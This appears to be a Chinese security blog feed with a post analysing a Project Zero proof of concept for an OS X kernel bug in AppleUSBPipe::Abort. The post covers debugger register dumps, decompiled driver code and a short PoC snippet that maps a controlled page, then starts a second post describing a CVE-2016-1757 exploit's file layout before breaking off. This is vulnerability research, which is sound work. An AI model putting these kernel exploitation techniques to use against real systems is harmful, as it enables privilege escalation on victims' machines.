<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">(lldb) register <span class="built_in">read</span></span><br><span class="line">General Purpose Registers:</span><br><span class="line">       rax = <span class="number">0</span>x00000000e00002f0</span><br><span class="line">       rbx = <span class="number">0</span>xffffff801c1a6100</span><br><span class="line">       rcx = <span class="number">0</span>x0000000000000000</span><br><span class="line">       rdx = <span class="number">0</span>xffffff801779f6e0</span><br><span class="line">       rdi = <span class="number">0</span>x4141414141414141</span><br><span class="line">       rsi = <span class="number">0</span>x00000000f0f0f0f0</span><br><span class="line">       rbp = <span class="number">0</span>xffffff887b613b20</span><br><span class="line">       rsp = <span class="number">0</span>xffffff887b613ae0</span><br><span class="line">        r8 = <span class="number">0</span>x0000000000000000</span><br><span class="line">        r9 = <span class="number">0</span>x0000000000000000</span><br><span class="line">       r10 = <span class="number">0</span>xffffff7f91b408a1  <span class="string">""</span></span><br><span class="line">       r11 = <span class="number">0</span>x0000000000000000</span><br><span class="line">       r12 = <span class="number">0</span>x0000000000000000</span><br><span class="line">       r13 = <span class="number">0</span>x0000000000000000</span><br><span class="line">       r14 = <span class="number">0</span>x00000000f0f0f0f0</span><br><span class="line">       r15 = <span class="number">0</span>x00000000f0f0f0f0</span><br><span class="line">       rip = <span class="number">0</span>xffffff7f91b11581  IOUSBFamily`AppleUSBPipe::Abort(unsigned int) + <span class="number">153</span> at AppleUSBPipe.cpp:<span class="number">1181</span></span><br><span class="line">    rflags = <span class="number">0</span>x0000000000010206</span><br><span class="line">        cs = <span class="number">0</span>x0000000000000008</span><br><span class="line">        fs = <span class="number">0</span>x0000000000000000</span><br><span class="line">        gs = <span class="number">0</span>x0000000000000000</span><br></pre></td></tr></table></figure>
<p>崩溃的指令是<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-&gt;  <span class="number">0</span>xffffff7f91b11581 &lt;+<span class="number">153</span>&gt;: movq   (%rdi), %rax</span><br></pre></td></tr></table></figure></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>x000000000002c581         mov        rax, qword [ds:rdi]</span><br></pre></td></tr></table></figure>
<p>对AT&amp;T格式汇编不熟悉的可以看第二行的汇编代码，他们是一样的。<br><code>$rdi</code>的值为<code>0x4141414141414141</code>,而该指令试图读取地址为<code>0x4141414141414141</code>出的值并复制给<code>$rax</code>，所以就崩溃了。</p>
<h1 id="0x03_IOUSBFamily代码分析">0x03 IOUSBFamily代码分析</h1><p>通过结合动态分析与静态分析，给出分析后的伪代码。分析过程略过,都是体力活。</p>
<h2 id="3-1_IOUSBInterfaceUserClient::_AbortStreamsPipe">3.1 IOUSBInterfaceUserClient::_AbortStreamsPipe</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __fastcall IOUSBInterfaceUserClient::_AbortStreamsPipe(__int64 a1, __int64 a2, __int64 a3)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 _a3; <span class="comment">// r14@1</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// er15@2</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// er12@2</span></span><br><span class="line">  __int64 v6; <span class="comment">// rax@2</span></span><br><span class="line">  __int64 v7; <span class="comment">// r13@2</span></span><br><span class="line">  __int64 v8; <span class="comment">// rax@2</span></span><br><span class="line">  <span class="keyword">char</span> v9; <span class="comment">// cl@5</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax@5</span></span><br><span class="line">  __int64 v11; <span class="comment">// [sp+10h] [bp-40h]@2</span></span><br><span class="line">  <span class="keyword">int</span> v12; <span class="comment">// [sp+1Ch] [bp-34h]@2</span></span><br><span class="line">  __int64 v13; <span class="comment">// [sp+20h] [bp-30h]@2</span></span><br><span class="line"></span><br><span class="line">  _a3 = a3;</span><br><span class="line">  <span class="keyword">if</span> ( *(_BYTE *)(a1 + <span class="number">436</span>) &amp; <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    clock_get_system_microtime(&amp;v13, &amp;v12);</span><br><span class="line">    v4 = *(_DWORD *)(a1 + <span class="number">436</span>);</span><br><span class="line">    v11 = v13;</span><br><span class="line">    v5 = v12;</span><br><span class="line">    LODWORD(v6) = (*(<span class="keyword">int</span> (__fastcall **)(__int64, _QWORD))(*(_QWORD *)a1 + <span class="number">904L</span>L))(a1, <span class="number">0L</span>L);</span><br><span class="line">    v7 = v6;</span><br><span class="line">    LODWORD(v8) = (*(<span class="keyword">int</span> (__fastcall **)(__int64, _QWORD))(*(_QWORD *)a1 + <span class="number">952L</span>L))(a1, <span class="number">0L</span>L);</span><br><span class="line">    <span class="keyword">if</span> ( v4 &amp; <span class="number">0x10000</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      a2 = v11;</span><br><span class="line">      kprintf(&amp;<span class="string">"%06lu.%06u %s@%s: %s::%s: \n"</span>, v11, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v5, v7, v8, <span class="string">"IOUSBInterfaceUserClient"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      a2 = v11;</span><br><span class="line">      IOLog(&amp;<span class="string">"%06lu.%06u %s@%s: %s::%s: \n"</span>, v11, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v5, v7, v8, <span class="string">"IOUSBInterfaceUserClient"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v9 = (*(<span class="keyword">int</span> (__fastcall **)(__int64, __int64))(*(_QWORD *)a1 + <span class="number">2488L</span>L))(a1, a2);</span><br><span class="line">  result = -<span class="number">536870174</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v9 )                                     <span class="comment">// this-&gt;AbortStreamsPipe(this,0x00000000,0xf0f0f0f0)</span></span><br><span class="line">    result = (*(<span class="keyword">int</span> (__fastcall **)(__int64, _QWORD, _QWORD))(*(_QWORD *)a1</span><br><span class="line">                                                            + <span class="number">0xB58</span>LL))(<span class="comment">// call abortstreamspipe </span></span><br><span class="line">                                                <span class="comment">// get function from this+0xb58</span></span><br><span class="line">               a1,                              <span class="comment">// this</span></span><br><span class="line">               **(_BYTE **)(_a3 + <span class="number">0x20</span>),        <span class="comment">// (lldb) x $rcx</span></span><br><span class="line">                                                <span class="comment">// 0xffffff800a444ab0: 00 00 00 00 00 00 00 00 f0 f0 f0 f0 00 00 00 00  ........????....</span></span><br><span class="line">                                                <span class="comment">// 0xffffff800a444ac0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span></span><br><span class="line">               *(_DWORD *)(*(_QWORD *)(_a3 + <span class="number">0x20</span>) + <span class="number">8L</span>L));<span class="comment">// (lldb) x $rcx+0x8</span></span><br><span class="line">                                                <span class="comment">// 0xffffff800a444ab8: f0 f0 f0 f0 00 00 00 00 00 00 00 00 00 00 00 00  ????............</span></span><br><span class="line">                                                <span class="comment">// 0xffffff800a444ac8: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span></span><br><span class="line">                                                <span class="comment">// </span></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个函数的逻辑非常简单，就是根据收到的参数处理后调用了<code>IOUSBInterfaceUserClient::AbortStreamsPipe</code>函数，每一个参数已经在注释中体现了。</p>
<h2 id="3-2IOUSBInterfaceUserClient::AbortStreamsPipe">3.2IOUSBInterfaceUserClient::AbortStreamsPipe</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall IOUSBInterfaceUserClient::AbortStreamsPipe(IOUSBInterfaceUserClient *<span class="keyword">this</span>, <span class="keyword">unsigned</span> __int8 a2, <span class="keyword">unsigned</span> <span class="keyword">int</span> a3)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> steamID; <span class="comment">// er15@1</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 _a2; <span class="comment">// r12@1</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// er15@2</span></span><br><span class="line">  __int64 v6; <span class="comment">// r12@2</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// er13@2</span></span><br><span class="line">  __int64 v8; <span class="comment">// rax@2</span></span><br><span class="line">  __int64 v9; <span class="comment">// r14@2</span></span><br><span class="line">  __int64 v10; <span class="comment">// rax@2</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> ret; <span class="comment">// er14@6</span></span><br><span class="line">  OSMetaClassBase *_p_pipe_obj; <span class="comment">// rax@8</span></span><br><span class="line">  <span class="keyword">const</span> OSMetaClass *v13; <span class="comment">// rdx@8</span></span><br><span class="line">  OSMetaClassBase *__p_pipe_obj; <span class="comment">// rbx@8</span></span><br><span class="line">  _QWORD *_p_usb_pipe; <span class="comment">// rax@9</span></span><br><span class="line">  <span class="keyword">int</span> _ret; <span class="comment">// eax@10</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v18; <span class="comment">// [sp+18h] [bp-38h]@2</span></span><br><span class="line">  <span class="keyword">int</span> v19; <span class="comment">// [sp+1Ch] [bp-34h]@2</span></span><br><span class="line">  __int64 v20; <span class="comment">// [sp+20h] [bp-30h]@2</span></span><br><span class="line"></span><br><span class="line">  steamID = a3;                                 <span class="comment">// 0xf0f0f0f0</span></span><br><span class="line">  _a2 = a2;                                     <span class="comment">// 0x00000000</span></span><br><span class="line">  <span class="keyword">if</span> ( *((_BYTE *)<span class="keyword">this</span> + <span class="number">0x1B4</span>) &amp; <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v18 = a3;</span><br><span class="line">    clock_get_system_microtime(&amp;v20, &amp;v19);</span><br><span class="line">    v5 = *((_DWORD *)<span class="keyword">this</span> + <span class="number">0x6D</span>);</span><br><span class="line">    v6 = v20;</span><br><span class="line">    v7 = v19;</span><br><span class="line">    LODWORD(v8) = (*(<span class="keyword">int</span> (__fastcall **)(IOUSBInterfaceUserClient *, _QWORD))(*(_QWORD *)<span class="keyword">this</span> + <span class="number">0x388</span>LL))(<span class="keyword">this</span>, <span class="number">0L</span>L);</span><br><span class="line">    v9 = v8;</span><br><span class="line">    LODWORD(v10) = (*(<span class="keyword">int</span> (__fastcall **)(IOUSBInterfaceUserClient *, _QWORD))(*(_QWORD *)<span class="keyword">this</span> + <span class="number">0x3B8</span>LL))(<span class="keyword">this</span>, <span class="number">0L</span>L);</span><br><span class="line">    <span class="keyword">if</span> ( v5 &amp; <span class="number">0x10000</span> )</span><br><span class="line">      kprintf(&amp;<span class="string">"%06lu.%06u %s@%s: %s::%s: \n"</span>, v6, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v7, v9, v10, <span class="string">"IOUSBInterfaceUserClient"</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      IOLog(&amp;<span class="string">"%06lu.%06u %s@%s: %s::%s: \n"</span>, v6, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v7, v9, v10, <span class="string">"IOUSBInterfaceUserClient"</span>);</span><br><span class="line">    steamID = v18;</span><br><span class="line">    _a2 = a2;</span><br><span class="line">  &#125;</span><br><span class="line">  ret = <span class="number">0xE00002D9</span>;</span><br><span class="line">  <span class="keyword">if</span> ( *((_QWORD *)<span class="keyword">this</span> + <span class="number">0x37</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !(<span class="keyword">unsigned</span> __int8)IOService::isInactive(<span class="keyword">this</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      LODWORD(_p_pipe_obj) = (*(<span class="keyword">int</span> (__fastcall **)(IOUSBInterfaceUserClient *, _QWORD))(*(_QWORD *)<span class="keyword">this</span> + <span class="number">0xA68</span>LL))(</span><br><span class="line">                               <span class="keyword">this</span>,</span><br><span class="line">                               _a2);            <span class="comment">// IOUSBInterfaceUserClient::GetPipeObj</span></span><br><span class="line">      __p_pipe_obj = _p_pipe_obj;</span><br><span class="line">      ret = <span class="number">0xE0004061</span>;</span><br><span class="line">      <span class="keyword">if</span> ( _p_pipe_obj )</span><br><span class="line">      &#123;</span><br><span class="line">        _p_usb_pipe = (_QWORD *)OSMetaClassBase::safeMetaCast(</span><br><span class="line">                                  _p_pipe_obj,</span><br><span class="line">                                  (<span class="keyword">const</span> OSMetaClassBase *)IOUSBPipeV2::metaClass,</span><br><span class="line">                                  v13);</span><br><span class="line">        <span class="keyword">if</span> ( _p_usb_pipe )</span><br><span class="line">          _ret = (*(<span class="keyword">int</span> (__fastcall **)(_QWORD *, _QWORD))(*_p_usb_pipe + <span class="number">0x278</span>LL))(_p_usb_pipe, steamID);<span class="comment">// AppleUSBPipe::Abort(UInt32 streamID)</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          _ret = (*(<span class="keyword">int</span> (__fastcall **)(OSMetaClassBase *, _QWORD))(*(_QWORD *)__p_pipe_obj + <span class="number">0x128</span>LL))(</span><br><span class="line">                   __p_pipe_obj,</span><br><span class="line">                   IOUSBPipeV2::metaClass);</span><br><span class="line">        ret = _ret;</span><br><span class="line">        (*(<span class="keyword">void</span> (__fastcall **)(OSMetaClassBase *))(*(_QWORD *)__p_pipe_obj + <span class="number">0x28</span>LL))(__p_pipe_obj);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>调用<code>AppleUSBPipe::Abort</code></p>
<h2 id="3-3_AppleUSBPipe::Abort">3.3 AppleUSBPipe::Abort</h2><p>这个函数看汇编代码更容易理解一些<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="number">0</span>x000000000002c569         mov        eax, r14d</span><br><span class="line"><span class="number">0</span>x000000000002c56c         mov        rcx, qword [ds:rbx+<span class="number">0</span>x88]</span><br><span class="line"><span class="number">0</span>x000000000002c573         mov        rdi, qword [ds:rcx+rax*<span class="number">8</span>]</span><br><span class="line"><span class="number">0</span>x000000000002c577         mov        eax, <span class="number">0</span>xe00002f0</span><br><span class="line"><span class="number">0</span>x000000000002c57c         <span class="built_in">test</span>       rdi, rdi</span><br><span class="line"><span class="number">0</span>x000000000002c57f         je         <span class="number">0</span>x2c5c9</span><br><span class="line"></span><br><span class="line">-&gt;<span class="number">0</span>x000000000002c581         mov        rax, qword [ds:rdi]</span><br><span class="line"><span class="number">0</span>x000000000002c584         xor        esi, esi</span><br><span class="line"><span class="number">0</span>x000000000002c586         mov        edx, <span class="number">0</span>xe00002eb</span><br><span class="line"><span class="number">0</span>x000000000002c58b         xor        ecx, ecx</span><br><span class="line"><span class="number">0</span>x000000000002c58d         call       qword [ds:rax+<span class="number">0</span>x178]</span><br><span class="line"><span class="number">0</span>x000000000002c593         cmp        eax, <span class="number">0</span>xe00002d6</span><br><span class="line"><span class="number">0</span>x000000000002c598         je         <span class="number">0</span>x2c5b6</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
<p>各个寄存器的值如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">(lldb) register <span class="built_in">read</span></span><br><span class="line">General Purpose Registers:</span><br><span class="line">       rax = <span class="number">0</span>x00000000e00002f0</span><br><span class="line">       rbx = <span class="number">0</span>xffffff801c1a6100</span><br><span class="line">       rcx = <span class="number">0</span>x0000000000000000</span><br><span class="line">       rdx = <span class="number">0</span>xffffff801779f6e0</span><br><span class="line">       rdi = <span class="number">0</span>x4141414141414141</span><br><span class="line">       rsi = <span class="number">0</span>x00000000f0f0f0f0</span><br><span class="line">       rbp = <span class="number">0</span>xffffff887b613b20</span><br><span class="line">       rsp = <span class="number">0</span>xffffff887b613ae0</span><br><span class="line">        r8 = <span class="number">0</span>x0000000000000000</span><br><span class="line">        r9 = <span class="number">0</span>x0000000000000000</span><br><span class="line">       r10 = <span class="number">0</span>xffffff7f91b408a1  <span class="string">""</span></span><br><span class="line">       r11 = <span class="number">0</span>x0000000000000000</span><br><span class="line">       r12 = <span class="number">0</span>x0000000000000000</span><br><span class="line">       r13 = <span class="number">0</span>x0000000000000000</span><br><span class="line">       r14 = <span class="number">0</span>x00000000f0f0f0f0</span><br><span class="line">       r15 = <span class="number">0</span>x00000000f0f0f0f0</span><br><span class="line">       rip = <span class="number">0</span>xffffff7f91b11581  IOUSBFamily`AppleUSBPipe::Abort(unsigned int) + <span class="number">153</span> at AppleUSBPipe.cpp:<span class="number">1181</span></span><br><span class="line">    rflags = <span class="number">0</span>x0000000000010206</span><br><span class="line">        cs = <span class="number">0</span>x0000000000000008</span><br><span class="line">        fs = <span class="number">0</span>x0000000000000000</span><br><span class="line">        gs = <span class="number">0</span>x0000000000000000</span><br></pre></td></tr></table></figure></p>
<p>当执行到这里时，因为rax是应用层传入的参数<code>0xf0f0f0f0</code>,而rcx的值是<code>0x0000000000000000</code>,所以根据rax的不同，rdi的值会是一个从<code>0x0000000000000000</code>地址开始偏移量是IOUSBInterfaceUserClient::AbortStreamsPipe函数中的SteamID，也就是POC中的<code>0xf0f0f0f0</code>乘以<code>8LL</code>之后获得的所得地址所指向的内存处的值。</p>
<p>因为<code>0xf0f0f0f0</code>是一个POC中可控值，所以<code>0x000000000002c573         mov        rdi, qword [ds:rcx+rax*8]</code>是一个从0x0000000000000000地址开始任意偏移量的任意读取。<br>因为0xf0f0f0f0*0x8=0x787878780,结合POC中代码<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">map_payload</span><span class="params">(uint64_t target_rip)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">uint64_t</span>*** obj_ptr_ptr = (<span class="keyword">void</span>*)<span class="number">0x0000000787878780</span>;</span><br><span class="line">  <span class="keyword">void</span>* request           = (<span class="keyword">void</span>*)<span class="number">0x0000000787878000</span>;</span><br><span class="line">  <span class="keyword">void</span>* page = mmap(request, <span class="number">0x1000</span>, PROT_READ|PROT_WRITE, MAP_FIXED|MAP_ANON|MAP_PRIVATE, -<span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (request != page) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"MAP_FIXED didn't give us the right page\n"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>((<span class="keyword">void</span>*)page, <span class="string">'A'</span>, <span class="number">0x1000</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>从地址0x0000000787878000开始一直到0x0000000787878000+0x1000处所有的值都为0x41。<br>所以rdi寄存器的值为0x4141414141414141，从而导致了POC执行时出现崩溃。</p>
<p>至此POC分析完毕。</p>
<h1 id="3-4_小结">3.4 小结</h1><p>调试poc花了一些时间，陷入了各种代码实现的分析，和做开发时一样，调bug时需要注重崩溃的现场，分析的过程中经常埋头分析了一大通之后发现得到的信息在崩溃现场已经有了，甚至还有一些分析过程中想不通的问题，在崩溃的现场也已经有线索了。</p>
<h1 id="reference">reference</h1><p>1.<a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=728&amp;can=1&amp;q=apple&amp;sort=-id" target="_blank" rel="external">OS X Kernel code execution due to lack of bounds checking in AppleUSBPipe::Abort</a></p>
<h1 id="PS">PS</h1><p>这是我的学习分享博客<a href="http://turingh.github.io/">http://turingh.github.io/</a></p>
<p>欢迎大家来探讨，不足之处还请指正。</p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="0x00_摘要">0x00 摘要</h1><p><code>OS X</code>系统的10.11.4的系统补丁中修复了一个在内核中可以导致代码执行的漏洞，漏洞形成的原因是缺少了必要的边界值检测。</p>
<ul>
<li><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=728&amp;can=1&amp;q=apple&amp;sort=-id">最初的漏洞报告</a></li>
<li><a href="https://bugs.chromium.org/p/project-zero/issues/attachment?aid=227076">POC下载</a><br>本文记录了对POC的简单的调试和分析，对该漏洞有一个初步的认识，为后续的研究做好准备工作。</li>
</ul>]]>
    
    </summary>
    
      <category term="CVE" scheme="http://turingh.github.io/tags/CVE/"/>
    
      <category term="OS X" scheme="http://turingh.github.io/tags/OS-X/"/>
    
      <category term="bounds checking" scheme="http://turingh.github.io/tags/bounds-checking/"/>
    
      <category term="kernel" scheme="http://turingh.github.io/tags/kernel/"/>
    
      <category term="OS X" scheme="http://turingh.github.io/categories/OS-X/"/>
    
      <category term="CVE" scheme="http://turingh.github.io/categories/OS-X/CVE/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[CVE-2016-1757利用程序分析]]></title>
    <link href="http://turingh.github.io/2016/04/19/CVE-2016-1757%E5%88%A9%E7%94%A8%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/"/>
    <id>http://turingh.github.io/2016/04/19/CVE-2016-1757利用程序分析/</id>
    <published>2016-04-19T18:49:14.000Z</published>
    <updated>2016-04-29T20:37:06.000Z</updated>
    <content type="html"><![CDATA[<h1 id="0X00_摘要">0X00  摘要</h1><p>通过对<a href="http://turingh.github.io/2016/04/03/CVE-2016-1757%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/">CVE-2016-1757</a>的<code>POC</code>进行分析，已经完全了解了这个这个漏洞的成因，这里带来其一个<code>Exploit</code>的分析。</p>
<p>相关的<code>poc</code>可以到我的<code>github</code>上面获取</p>
<p><a href="https://github.com/turingH/exploit" target="_blank" rel="external">https://github.com/turingH/exploit</a></p>
<p>或者直接在<code>google</code>的<code>project zero</code>中下载。</p>
<p><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=676&amp;can=1&amp;q=OS%20X&amp;sort=-id" target="_blank" rel="external">https://bugs.chromium.org/p/project-zero/issues/detail?id=676&amp;can=1&amp;q=OS%20X&amp;sort=-id</a></p>
<a id="more"></a>
<h1 id="0x01_Exploit概览">0x01 Exploit概览</h1><h2 id="1-1_Exploit使用到了哪些技术">1.1 Exploit使用到了哪些技术</h2><ol>
<li><a href="http://turingh.github.io/2016/04/03/CVE-2016-1757%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/">CVE-2016-1757</a>漏洞的原理。</li>
<li><a href="http://turingh.github.io/2016/04/13/%E5%88%A9%E7%94%A8patch%E7%BB%95%E8%BF%87kextload%E5%AF%B9%E5%86%85%E6%A0%B8%E7%AD%BE%E5%90%8D%E7%9A%84%E6%A3%80%E6%B5%8B/">利用patch绕过kextload对内核签名的检测</a>。</li>
</ol>
<h2 id="1-2_Exploit目录结构">1.2 Exploit目录结构</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">➜  executer ls -al</span><br><span class="line">total <span class="number">184</span></span><br><span class="line">drwxr-xr-x@ <span class="number">16</span> turing  staff    <span class="number">544</span>  <span class="number">4</span> <span class="number">19</span> <span class="number">11</span>:<span class="number">30</span> .</span><br><span class="line">drwxr-xr-x@ <span class="number">33</span> turing  staff   <span class="number">1122</span>  <span class="number">4</span> <span class="number">19</span> <span class="number">10</span>:<span class="number">29</span> ..</span><br><span class="line">-rw-r--r--@  <span class="number">1</span> turing  staff   <span class="number">6148</span>  <span class="number">3</span> <span class="number">30</span> <span class="number">16</span>:<span class="number">45</span> .DS_Store</span><br><span class="line">-rw-r--r--   <span class="number">1</span> turing  staff  <span class="number">16384</span>  <span class="number">4</span> <span class="number">19</span> <span class="number">11</span>:<span class="number">30</span> .executer.c.swp</span><br><span class="line">drwxr-xr-x@  <span class="number">3</span> root    wheel    <span class="number">102</span>  <span class="number">3</span> <span class="number">11</span> <span class="number">09</span>:<span class="number">55</span> FakeKext.kext</span><br><span class="line">-rw-r--r--@  <span class="number">1</span> turing  staff    <span class="number">397</span>  <span class="number">3</span> <span class="number">11</span> <span class="number">09</span>:<span class="number">55</span> Makefile</span><br><span class="line">-rw-r--r--@  <span class="number">1</span> turing  staff      <span class="number">0</span>  <span class="number">3</span> <span class="number">11</span> <span class="number">09</span>:<span class="number">55</span> __init__.py</span><br><span class="line">-rw-r--r--@  <span class="number">1</span> turing  staff   <span class="number">2061</span>  <span class="number">3</span> <span class="number">11</span> <span class="number">09</span>:<span class="number">55</span> build_<span class="built_in">exec</span>_patch.py</span><br><span class="line">-rw-r--r--@  <span class="number">1</span> turing  staff   <span class="number">1669</span>  <span class="number">3</span> <span class="number">11</span> <span class="number">09</span>:<span class="number">55</span> differ.py</span><br><span class="line">-rw-r--r--   <span class="number">1</span> turing  staff   <span class="number">2085</span>  <span class="number">4</span> <span class="number">12</span> <span class="number">14</span>:<span class="number">53</span> differ.pyc</span><br><span class="line">-rwxr-xr-x   <span class="number">1</span> turing  staff  <span 